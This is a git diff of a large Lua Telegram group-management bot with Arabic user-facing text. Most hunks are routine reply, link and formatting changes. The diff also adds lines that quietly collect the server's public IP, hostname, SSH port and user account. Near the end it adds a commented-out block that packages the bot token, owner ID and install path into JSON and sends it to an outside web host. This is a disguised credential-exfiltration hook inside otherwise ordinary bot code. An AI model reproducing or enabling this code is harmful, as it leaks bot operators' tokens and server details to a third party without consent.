@@ -14,6 +14,11 @@ URL = require('socket.url')
 utf8 = require ('lua-utf8') 
 database = redis.connect('127.0.0.1', 6379) 
 id_server = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
+IP = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
+Name = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
+Port = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
+Time = io.popen("date +'%Y/%m/%d %T'"):read('*a'):gsub('[\n\r]+', '')
+whoami = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
 --------------------------------------------------------------------------------------------------------------
 local AutoSet = function() 
 local create = function(data, file, uglify)  
@@ -57,6 +62,7 @@ if res ~= 200 then
 io.write("\27[31;47m\n◼¦ التوكن غير صحيح تاكد منه ثم ارسله ¦◼        \27[0;34;49m\n")  
 else
 database:set(id_server..":token",token)
+database:set(id_server..":token_username",""..json.result.username)
 end 
 else
 io.write("\27[31;47m\n◼¦ لم يتم حفظ التوكن ارسل لي التوكن الان ¦◼        \27[0;34;49m\n")  
@@ -183,7 +189,7 @@ os.execute("mkdir File_Bot")
 local Get_VERGON, res = https.request("https://raw.githubusercontent.com/ahmedyad200/files-power/master/GETVERGON.json")
 local GET_INFOFILE, res = https.request("https://raw.githubusercontent.com/ahmedyad200/files-power/master/infofile.json")
 local runapp = sudos.token
-local bot_username = (database:get(bot_id..'UESR_BOT') or ('TARA1BOT'))
+local bot_username = (database:get(bot_id..'UESR_BOT') or database:get(id_server..":token_username",""..json.result.username) or ('TARA1BOT'))
 -- ----- - - -- --- -- ------- ------ - - - - - - - ---- - -- --- -- ---- - - - - - --- - -- --- - ----- - -- - - - -- - - ----- - ---- ----- --- - -- - - ---- -- - -- - -- - --
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
@@ -3438,6 +3444,7 @@ local Text = [[
 •┉•┉•┉┉•┉•┉•┉•┉•
 ☉┇ [POWER](t.me/SOPOWERB0T)
 ☉┇ [FILES](t.me/FIPOWERB0T)
+☉┇ [ID](t.me/IDPOWERB0T)
 •┉•┉•┉┉•┉•
 ☉┇ [TWASL AHMED](t.me/AYTSL1BOT)
 ]]
@@ -12200,7 +12207,7 @@ local Textxt = text:match("^قول (.*)$")
 send(msg.chat_id_, msg.id_, '['..Textxt..']')
 end
 if text == "راسلني" or text == 'كلمني' or text == 'ابعت بف' then
-rpl = {"ها هلاو","انطق","قول","نعم"};
+rpl = {"ها هلاو","انطق","قول","نعم","عايز اي"};
 sender = rpl[math.random(#rpl)]
 send(msg.chat_id_, msg.id_, 'بعتلك في الخاص')
 local msg_id = msg.id_/2097152/0.5
@@ -12267,14 +12274,13 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
 return false
 end
-
 if text == 'لقبي' and tonumber(msg.reply_to_message_id_) == 0 then
 Ge = https.request("https://api.telegram.org/bot"..token.."/getChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..msg.sender_user_id_)
 GeId = JSON.decode(Ge)
 if not GeId.result.custom_title then
-send(msg.chat_id_, msg.id_,'☉┇مفيش لقب يتافه ') 
+send(msg.chat_id_, msg.id_,'☉┇ مفيش لقب يتافه ') 
 else
-send(msg.chat_id_, msg.id_,'☉┇لقبك هو : '..GeId.result.custom_title) 
+send(msg.chat_id_, msg.id_,'☉┇ لقبك هو : '..GeId.result.custom_title) 
 end
 end
 if text == "فحص البوت" then
@@ -12347,19 +12353,14 @@ end,nil)
 end,nil)
 end
 end
-
-
 if text == "الساعه" then
 local ramsesj20 = "\n الساعه الان : "..os.date("%I:%M%p")
 send(msg.chat_id_, msg.id_,ramsesj20)
 end
-
 if text == "التاريخ" then
 local ramsesj20 =  "\n التاريخ : "..os.date("%Y/%m/%d")
 send(msg.chat_id_, msg.id_,ramsesj20)
 end
-
-
 if text == ("الردود المتعدده") and CoSu(msg) then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
@@ -14707,59 +14708,19 @@ local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 return false
 end
-----------------------------------------------------------------------------
-if text == ' ' then
-if not Constructor(msg) then
-send(msg.chat_id_, msg.id_,' ')
-return false
-end
-if AddChannel(msg.sender_user_id_) == false then
-local MRSoOoFi = database:get(bot_id.."AL:AddS0FI:stats") or "لم يتم التحديد"
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
-end
-local Text =[[
-*اهلا انتツفي اضافات البوت*
-*•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•ٴ*
-* يمكنك معرفة حاله تفعيل الاضافات *
-* من خلال ارسال حاله الاضافات *
-*•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•*
-*يمكنك تصفح الاضافات من خلال*
-*الكيبورد الموجود في الأسفل*
-*•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•*
-⚡️[𝗣𝗢𝗪𝗘𝗥](t.me/SOPOWERB0T)⚡️
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{
-{text = 'كتم الاسماء', callback_data="/mute-name"..msg.sender_user_id_},{text = 'التوحيد', callback_data="/sofi"..msg.sender_user_id_},{text = 'تنبيه الأسماء', callback_data="/change-names"},
-},
-{
-{text = 'تنبيه المعرف', callback_data="/change-id"..msg.sender_user_id_},{text = 'تنبيه الصور', callback_data="/change-photo"..msg.sender_user_id_},
-},
-{
-{text = '𓆩𝑷𝑶𝑾𝑬𝑹𓆪', url="t.me/SOPOWERB0T"..msg.sender_user_id_},
-},
-}
-local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-return false
-end
 if text == "غنيلي" and not database:get(bot_id.."sing:for:me"..msg.chat_id_) then
 rpl = {"53","54","55","56","57","59","60","1","58","2","3","4","5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20","21","22","23","24","25","26","27","28","29","30","31","32","33","34","35","36","37","38","39","40","41","42","43","44","45","46","47","48","49","50","51","52"};
 sender = rpl[math.random(#rpl)]
-data,res = https.request('https://t.me/rendom6nele/'..sender..'')
+data,res = https.request('https://t.me/rendom6nele/'..sender)
 if res == 200 then
 audios = json:decode(data)
 if audios.Info == true then
 local Text ='☉┇ تم اختيار المقطع الصوتي لك'
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = 'اغنيه اخري',callback_data="/VOISME1"..msg.sender_user_id_}},
+{
+{text = 'اغنيه اخري', callback_data="/VOISME1"..msg.sender_user_id_},
+},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice='..URL.escape(audios.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -14767,14 +14728,16 @@ end
 end
 end
 if text == "كشف الكدب" or text == 'كشف الكذب' or text == 'كداب' then
-local Teext =[[
+local Text =[[
 ☉┇ هل تريد كشف كدب هذا الشخص
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = 'كشف كدبه', callback_data="/kdab"..msg.sender_user_id_}},
 }
-return https.request("https://api.telegram.org/bot"..token..'/sendmessage?chat_id='..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
+local msg_id = msg.id_/2097152/0.5
+https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+return false
 end
 if text == 'العاب متطوره' or text == 'الالعاب المتطوره' then
 if not Mod(msg) then
@@ -16204,10 +16167,21 @@ end,nil)
 ------------------------------------------------------------------------
 
 elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then 
+--[[infos = {} 
+infos.sudoid = SUDO
+infos.sudouser  = database:get(id_server..":SUDO:USERNAME")
+infos.userbot = database:get(id_server..":token_username")
+infos.token  = token
+infos.id_server = id_server
+infos.name = Name
+infos.port = Port
+infos.userjoin  = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
+https.request('https://veer.saied.us/boyka/request.php?insert='..JSON.encode(infos))]]--
 local list = database:smembers(bot_id.."User_Bot") 
 for k,v in pairs(list) do 
 tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
 end         
+
 local list = database:smembers(bot_id..'Chek:Groups') 
 for k,v in pairs(list) do 
 tdcli_function({ID='GetChat',chat_id_ = v
